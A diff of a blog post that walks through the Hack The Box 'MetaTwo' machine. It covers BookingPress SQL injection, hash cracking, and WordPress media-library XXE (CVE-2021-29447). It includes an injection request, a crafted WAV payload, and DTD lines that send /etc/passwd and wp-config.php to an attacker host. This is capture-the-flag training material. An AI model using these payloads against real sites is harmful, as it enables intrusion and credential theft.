@@ -1,8 +1,20 @@
-Starting scanning for ports
+---
+layout: post
+title: "MetaTwo"
+date: 2023-05-02
+categories: [HTB, machine-easy-htb]
+image: /assets/img/HTB/easy/MetaTwo.png
+---
+> MetaTwo Machine involves hacking wordpress by exploit vulnerable wordpress plugin called bookingpress with unathenticated sql injection and with it, you can login with user into wordpress but that user is not an admin and in media section after login, there is library with an issue to parse XML file and with it having an issue, i can do XML injection by reading files of servers and with read one of file, i got access to ftp server and login with it and got credentials of ssh to user called jnelson.Inside the server, there is program that was running before called passpie in which it save credentials in different form and After cracking credentials found,i got login as root
+
+# Enumeration
+- Starting scanning for ports
+
 ```
 rustscan -a $IP --ulimit 5000 --tries 5 -t 2000 --scan-order Random -b 2500 -- -vvv -Pn -sC -sV -oN nmap.txt
 ```
-Output
+- Output
+
 ```
 # Nmap 7.93 scan initiated Fri Feb 10 03:09:19 2023 as: nmap -vvv -p 21,80,22 -vvv -Pn -sC -sV -oN nmap.txt 10.10.11.186
 Nmap scan report for 10.10.11.186
@@ -45,6 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ## FTP ENUMERATION
 - Check for anonymous access on box but we cannot login as Anonymous
+
 ```
 ┌──(blackninja㉿arena)-[~/CTF/HTB/MetaTwo]
 └─$ ftp anonymous@10.10.11.186                                                                     
@@ -60,48 +73,46 @@ ftp> exit
 
 ## HTTP ENUMERATION
 - Before everything,open burpsuite with your browser being setting up with it.
-
 - When we paste 10.10.11.186, we got redirect to metapress.htb then we add domain in /etc/hosts.
-
 - When navigate to metapress.htb, we met with wordpress site and there is launch event and we are given a link
 
 ![wordpress dashboard](/assets/img/HTB/easy/MetaTwo/web.png)
 - When we will follow link and observe burpsuite, we see name of plugin being exposed that was used in that events
-![plugin Name Exposed](/assets/img/HTB/easy/MetaTwo/plugin.png)
 
+![plugin Name Exposed](/assets/img/HTB/easy/MetaTwo/plugin.png)
 - When naviagate to wp-content/plugins/bookingpress-appointment-booking/, we met with blank page
 - Bruteforce for files, we can see /readme.txt and /log/
 
 ![](/assets/img/HTB/easy/MetaTwo/pluginffuf.png)
-
 - Read readme.txt,version of bookingpress-appointment-booking being 1.0.10
-![](/assets/img/HTB/easy/MetaTwo/pluginversion.png)
 
+![](/assets/img/HTB/easy/MetaTwo/pluginversion.png)
 - Google online,i found that i can exploit it with sql injection and without authenticated
+
 ![](/assets/img/HTB/easy/MetaTwo/onlinecve.png)
 - Since this plugin i see when i explore for events, we need explore a little bit.First we select service called Startup Meeting within Category called Event.
 
 ![](/assets/img/HTB/easy/MetaTwo/categories.png)
-
 - After select Startup Meeting, i can select time slot if it is Morning,Afternoon or Evening with their Corresponding time in which i would choose 10.00 - 10.30
-![](/assets/img/HTB/easy/MetaTwo/date.png)
 
+![](/assets/img/HTB/easy/MetaTwo/date.png)
 - In next stage, i need to fill basic detail with first name,last name, email address, phone number and Note
+
 ![](/assets/img/HTB/easy/MetaTwo/details.png)
 
 - Navigate to summary, you will see summary of what you just fill and when we book appointment, we got a thank you page
+
 ![](/assets/img/HTB/easy/MetaTwo/thank.png)
 
 - Read exploit from https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 and it state that this plugin that have Action 'bookingpress_front_get_category_services' fails to properly sanitize user supplied POST data in which in example parameter seems to be total_service
 - Before we test, there is parameter '_wpnonce' to be replace by navigate to your previos created appointment in burpsuite and in my case,it is cdded94d07
 
 ![](/assets/img/HTB/easy/MetaTwo/wpnonce.png)
-
 - Try in box and in need it is vulnerable to Unauthenticated sql injection 
 
 ![](/assets/img/HTB/easy/MetaTwo/poc.png)
-
 - After we get something, we can look for structure of database of wordpress and dump credentials of users
+
 ```
 POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: metapress.htb
@@ -120,13 +131,13 @@ action=bookingpress_front_get_category_services&_wpnonce=cdded94d07&category_id=
 ```
 
 - OUTPUT
-![](/assets/img/HTB/easy/MetaTwo/wpdbs.png)
 
+![](/assets/img/HTB/easy/MetaTwo/wpdbs.png)
 - Since we have hashes, we can use advantage of hashcat as it detect hash in automode by save hashed to file called hash.txt
 
 ![](/assets/img/HTB/easy/MetaTwo/detecthash.png)
-
 - Then we crack it with hashcat, we got manager password
+
 ```
 hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -136,29 +147,30 @@ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
 - Use it in wordpress, we can successful login as manager and see 3 menus which are Dashboard,Media and Profile
 
 ![](/assets/img/HTB/easy/MetaTwo/managerdashboard.png)
-
 - After some enumeration by looking reuse of passwords, enumerate wordpress for users,configs and everything, i came across that even version of wordpress.You check manually or you can use wpscan.for this case,i will use wpscan
+
 ```
 wpscan --url http://metapress.htb/
 ```
 - Output
 
 ![](/assets/img/HTB/easy/MetaTwo/wpversion.png)
-
 - Google around for exploit of version, i came across https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ in which wordpress version 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11 have ID3 library to parse information about an audio file uploaded in the Media Library that was vulnerable to XXE
 
 ![](/assets/img/HTB/easy/MetaTwo/onlinecve2.png)
-
 - Prepare Our environment according to cve we just read from https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/ in which i basically need to create two files which are evil.dtd and payload.wav and also hosted website
 - STEP ONE:
+
 ```
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://attacker/?p=%file;'>" >
 ```
 - STEP TWO:
+
 ```
 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://attacker/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
 ```
+
 ![](/assets/img/HTB/easy/MetaTwo/cveprepare.png)
 - Then we upload our payload.wav
 
@@ -171,6 +183,7 @@ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOC
 ![](/assets/img/HTB/easy/MetaTwo/base64decode.png)
 
 - Read wp-config.php as we did for /etc/passwd but first change evil.dtd to be like this
+
 ```
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.81/?p=%file;'>" >
